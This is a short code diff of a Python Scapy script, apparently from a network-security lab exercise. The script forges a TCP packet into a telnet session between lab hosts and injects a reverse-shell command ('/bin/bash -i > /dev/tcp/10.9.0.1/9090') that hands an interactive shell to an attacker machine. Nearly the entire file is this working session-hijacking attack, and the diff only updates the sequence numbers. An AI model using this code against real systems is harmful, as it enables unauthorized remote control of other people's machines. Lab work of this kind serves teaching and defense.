@@ -2,9 +2,9 @@
 from scapy.all import *
 
 ip = IP(src="10.9.0.6", dst="10.9.0.5")
-tcp = TCP(sport=46112, dport=23, flags="A", seq=3754695758, ack=1276995672)
+tcp = TCP(sport=38342, dport=23, flags="A", seq=1121284776, ack=818274281)
 data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
 pkt = ip/tcp/data
 
-ls(pkt)
+# ls(pkt)
 send(pkt, verbose=0)
